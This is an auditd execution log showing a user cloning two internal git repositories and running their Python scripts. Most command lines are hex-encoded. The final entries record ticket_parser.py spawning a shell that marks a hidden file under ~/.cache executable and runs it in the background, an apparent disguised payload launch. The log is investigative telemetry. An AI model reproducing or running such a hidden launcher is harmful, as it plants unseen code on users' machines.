type=PROCTITLE msg=audit(1789481943.748:347): proctitle=67697400636C6F6E6500687474703A2F2F646576666F7267652E696E7465726E616C3A333030302F64696F67656E65732F64696F67656E65732D627265616B726F6F6D2D726F737465722E676974
type=SYSCALL msg=audit(1789481943.756:348): arch=c000003e syscall=59 success=yes exit=0 a0=5610d2f1f390 a1=5610d2f1f218 a2=5610d2f1fe10 a3=7f8365e9ab28 items=3 ppid=1475 pid=1476 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="git" exe="/usr/lib/git-core/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481943.756:348): argc=4 a0="/usr/lib/git-core/git" a1="remote-http" a2="origin" a3="http://devforge.internal:3000/diogenes/diogenes-breakroom-roster.git"
type=CWD msg=audit(1789481943.756:348): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789481943.756:348): item=0 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481943.756:348): item=1 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481943.756:348): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789481943.756:348): proctitle=2F7573722F6C69622F6769742D636F72652F6769740072656D6F74652D68747470006F726967696E00687474703A2F2F646576666F7267652E696E7465726E616C3A333030302F64696F67656E65732F64696F67656E65732D627265616B726F6F6D2D726F737465722E676974
type=SYSCALL msg=audit(1789481943.756:349): arch=c000003e syscall=59 success=yes exit=0 a0=55ceac28fee0 a1=55ceac28fd88 a2=55ceac2909a0 a3=7f146dac8b28 items=3 ppid=1476 pid=1477 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="git-remote-http" exe="/usr/lib/git-core/git-remote-http" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481943.756:349): argc=3 a0="/usr/lib/git-core/git-remote-http" a1="origin" a2="http://devforge.internal:3000/diogenes/diogenes-breakroom-roster.git"
type=CWD msg=audit(1789481943.756:349): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789481943.756:349): item=0 name="/usr/lib/git-core/git-remote-http" inode=426839 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481943.756:349): item=1 name="/usr/lib/git-core/git-remote-http" inode=426839 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481943.756:349): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789481943.756:349): proctitle=2F7573722F6C69622F6769742D636F72652F6769742D72656D6F74652D68747470006F726967696E00687474703A2F2F646576666F7267652E696E7465726E616C3A333030302F64696F67656E65732F64696F67656E65732D627265616B726F6F6D2D726F737465722E676974
type=SYSCALL msg=audit(1789481943.800:350): arch=c000003e syscall=59 success=yes exit=0 a0=5610d2f22580 a1=5610d2f22418 a2=5610d2f22cc0 a3=7f8365e9ab28 items=3 ppid=1475 pid=1480 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="git" exe="/usr/lib/git-core/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481943.800:350): argc=7 a0="/usr/lib/git-core/git" a1="index-pack" a2="--stdin" a3="-v" a4="--fix-thin" a5=2D2D6B6565703D66657463682D7061636B2031343735206F6E204C542D5441696E73776F727468 a6="--check-self-contained-and-connected"
type=CWD msg=audit(1789481943.800:350): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789481943.800:350): item=0 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481943.800:350): item=1 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481943.800:350): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789481943.800:350): proctitle=2F7573722F6C69622F6769742D636F72652F67697400696E6465782D7061636B002D2D737464696E002D76002D2D6669782D7468696E002D2D6B6565703D66657463682D7061636B2031343735206F6E204C542D5441696E73776F727468002D2D636865636B2D73656C662D636F6E7461696E65642D616E642D636F6E6E6563
type=SYSCALL msg=audit(1789481943.820:351): arch=c000003e syscall=59 success=yes exit=0 a0=5610d2f23200 a1=5610d2f21758 a2=5610d2f22700 a3=7f8365e9ab28 items=3 ppid=1475 pid=1481 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="git" exe="/usr/lib/git-core/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481943.820:351): argc=9 a0="/usr/lib/git-core/git" a1="rev-list" a2="--objects" a3="--stdin" a4="--not" a5="--all" a6="--quiet" a7="--alternate-refs" a8=2D2D70726F67726573733D436865636B696E6720636F6E6E6563746976697479
type=CWD msg=audit(1789481943.820:351): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789481943.820:351): item=0 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481943.820:351): item=1 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481943.820:351): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789481943.820:351): proctitle=2F7573722F6C69622F6769742D636F72652F676974007265762D6C697374002D2D6F626A65637473002D2D737464696E002D2D6E6F74002D2D616C6C002D2D7175696574002D2D616C7465726E6174652D72656673002D2D70726F67726573733D436865636B696E6720636F6E6E6563746976697479
type=SYSCALL msg=audit(1789481951.384:352): arch=c000003e syscall=59 success=yes exit=0 a0=56165990bbf0 a1=561659907280 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1488 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481951.384:352): argc=2 a0="ls" a1="--color=auto"
type=CWD msg=audit(1789481951.384:352): cwd="/home/Tom/Projects/diogenes-breakroom-roster"
type=PATH msg=audit(1789481951.384:352): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481951.384:352): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481951.384:352): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789481951.384:352): proctitle=6C73002D2D636F6C6F723D6175746F
type=SYSCALL msg=audit(1789481960.968:353): arch=c000003e syscall=59 success=yes exit=0 a0=5616599141a0 a1=56165990e8c0 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1491 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="python3" exe="/usr/bin/python3.11" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481960.968:353): argc=2 a0="python3" a1="roster.py"
type=CWD msg=audit(1789481960.968:353): cwd="/home/Tom/Projects/diogenes-breakroom-roster"
type=PATH msg=audit(1789481960.968:353): item=0 name="/usr/bin/python3" inode=414745 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481960.968:353): item=1 name="/usr/bin/python3" inode=415062 dev=08:02 mode=0120777 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481960.968:353): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789481960.968:353): proctitle=707974686F6E3300726F737465722E7079
type=SYSCALL msg=audit(1789481999.808:354): arch=c000003e syscall=59 success=yes exit=0 a0=5616597da1e0 a1=561659864900 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1492 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="git" exe="/usr/bin/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481999.808:354): argc=3 a0="git" a1="clone" a2="http://devforge.internal:3000/diogenes/diogenes-ticket-parser.git"
type=CWD msg=audit(1789481999.808:354): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789481999.808:354): item=0 name="/usr/bin/git" inode=426818 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481999.808:354): item=1 name="/usr/bin/git" inode=426818 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481999.808:354): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789481999.808:354): proctitle=67697400636C6F6E6500687474703A2F2F646576666F7267652E696E7465726E616C3A333030302F64696F67656E65732F64696F67656E65732D7469636B65742D7061727365722E676974
type=SYSCALL msg=audit(1789481999.816:355): arch=c000003e syscall=59 success=yes exit=0 a0=55d21710d590 a1=55d21710d418 a2=55d21710e010 a3=7eff4bb26b28 items=3 ppid=1492 pid=1493 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="git" exe="/usr/lib/git-core/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481999.816:355): argc=4 a0="/usr/lib/git-core/git" a1="remote-http" a2="origin" a3="http://devforge.internal:3000/diogenes/diogenes-ticket-parser.git"
type=CWD msg=audit(1789481999.816:355): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789481999.816:355): item=0 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481999.816:355): item=1 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481999.816:355): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789481999.816:355): proctitle=2F7573722F6C69622F6769742D636F72652F6769740072656D6F74652D68747470006F726967696E00687474703A2F2F646576666F7267652E696E7465726E616C3A333030302F64696F67656E65732F64696F67656E65732D7469636B65742D7061727365722E676974
type=SYSCALL msg=audit(1789481999.816:356): arch=c000003e syscall=59 success=yes exit=0 a0=55fe3177eee0 a1=55fe3177ed88 a2=55fe3177f9a0 a3=7f783eb62b28 items=3 ppid=1493 pid=1494 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="git-remote-http" exe="/usr/lib/git-core/git-remote-http" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481999.816:356): argc=3 a0="/usr/lib/git-core/git-remote-http" a1="origin" a2="http://devforge.internal:3000/diogenes/diogenes-ticket-parser.git"
type=CWD msg=audit(1789481999.816:356): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789481999.816:356): item=0 name="/usr/lib/git-core/git-remote-http" inode=426839 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481999.816:356): item=1 name="/usr/lib/git-core/git-remote-http" inode=426839 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481999.816:356): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789481999.816:356): proctitle=2F7573722F6C69622F6769742D636F72652F6769742D72656D6F74652D68747470006F726967696E00687474703A2F2F646576666F7267652E696E7465726E616C3A333030302F64696F67656E65732F64696F67656E65732D7469636B65742D7061727365722E676974
type=SYSCALL msg=audit(1789481999.916:357): arch=c000003e syscall=59 success=yes exit=0 a0=55d217110860 a1=55d2171106f8 a2=55d217110fa0 a3=7eff4bb26b28 items=3 ppid=1492 pid=1497 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="git" exe="/usr/lib/git-core/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481999.916:357): argc=7 a0="/usr/lib/git-core/git" a1="index-pack" a2="--stdin" a3="-v" a4="--fix-thin" a5=2D2D6B6565703D66657463682D7061636B2031343932206F6E204C542D5441696E73776F727468 a6="--check-self-contained-and-connected"
type=CWD msg=audit(1789481999.916:357): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789481999.916:357): item=0 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481999.916:357): item=1 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481999.916:357): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789481999.916:357): proctitle=2F7573722F6C69622F6769742D636F72652F67697400696E6465782D7061636B002D2D737464696E002D76002D2D6669782D7468696E002D2D6B6565703D66657463682D7061636B2031343932206F6E204C542D5441696E73776F727468002D2D636865636B2D73656C662D636F6E7461696E65642D616E642D636F6E6E6563
type=SYSCALL msg=audit(1789481999.972:358): arch=c000003e syscall=59 success=yes exit=0 a0=55d2171114d0 a1=55d21710f9d8 a2=55d217110fa0 a3=7eff4bb26b28 items=3 ppid=1492 pid=1500 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="git" exe="/usr/lib/git-core/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789481999.972:358): argc=9 a0="/usr/lib/git-core/git" a1="rev-list" a2="--objects" a3="--stdin" a4="--not" a5="--all" a6="--quiet" a7="--alternate-refs" a8=2D2D70726F67726573733D436865636B696E6720636F6E6E6563746976697479
type=CWD msg=audit(1789481999.972:358): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789481999.972:358): item=0 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481999.972:358): item=1 name="/usr/lib/git-core/git" inode=426822 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789481999.972:358): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789481999.972:358): proctitle=2F7573722F6C69622F6769742D636F72652F676974007265762D6C697374002D2D6F626A65637473002D2D737464696E002D2D6E6F74002D2D616C6C002D2D7175696574002D2D616C7465726E6174652D72656673002D2D70726F67726573733D436865636B696E6720636F6E6E6563746976697479
type=SYSCALL msg=audit(1789482001.592:359): arch=c000003e syscall=59 success=yes exit=0 a0=561659907d00 a1=56165990bad0 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1501 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789482001.592:359): argc=2 a0="ls" a1="--color=auto"
type=CWD msg=audit(1789482001.592:359): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789482001.592:359): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482001.592:359): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482001.592:359): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789482001.592:359): proctitle=6C73002D2D636F6C6F723D6175746F
type=SYSCALL msg=audit(1789482007.524:360): arch=c000003e syscall=59 success=yes exit=0 a0=561659918550 a1=5616598ab0c0 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1506 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789482007.524:360): argc=2 a0="ls" a1="--color=auto"
type=CWD msg=audit(1789482007.524:360): cwd="/home/Tom/Projects/diogenes-ticket-parser"
type=PATH msg=audit(1789482007.524:360): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482007.524:360): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482007.524:360): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789482007.524:360): proctitle=6C73002D2D636F6C6F723D6175746F
type=SYSCALL msg=audit(1789482020.816:361): arch=c000003e syscall=59 success=yes exit=0 a0=5616598ab0c0 a1=5616599027c0 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1511 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="python3" exe="/usr/bin/python3.11" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789482020.816:361): argc=2 a0="python3" a1="ticket_parser.py"
type=CWD msg=audit(1789482020.816:361): cwd="/home/Tom/Projects/diogenes-ticket-parser"
type=PATH msg=audit(1789482020.816:361): item=0 name="/usr/bin/python3" inode=414745 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482020.816:361): item=1 name="/usr/bin/python3" inode=415062 dev=08:02 mode=0120777 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482020.816:361): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789482020.816:361): proctitle=707974686F6E33007469636B65745F7061727365722E7079
type=SYSCALL msg=audit(1789482021.140:362): arch=c000003e syscall=59 success=yes exit=0 a0=7fad9d030610 a1=7fad9cb2f0f0 a2=7ffc86e9d270 a3=7fad9d0c76a0 items=3 ppid=1511 pid=1512 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sh" exe="/usr/bin/dash" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789482021.140:362): argc=3 a0="/bin/sh" a1="-c" a2=63686D6F64202B78207E2F2E63616368652F2E7469636B65742D7061727365722F2E696E746567726974793B207E2F2E63616368652F2E7469636B65742D7061727365722F2E696E7465677269747920323E26312026
type=CWD msg=audit(1789482021.140:362): cwd="/home/Tom/Projects/diogenes-ticket-parser"
type=PATH msg=audit(1789482021.140:362): item=0 name="/bin/sh" inode=393419 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482021.140:362): item=1 name="/bin/sh" inode=393430 dev=08:02 mode=0120777 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789482021.140:362): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789482021.140:362): proctitle=2F62696E2F7368002D630063686D6F64202B78207E2F2E63616368652F2E7469636B65742D7061727365722F2E696E746567726974793B207E2F2E63616368652F2E7469636B65742D7061727365722F2E696E7465677269747920323E26312026
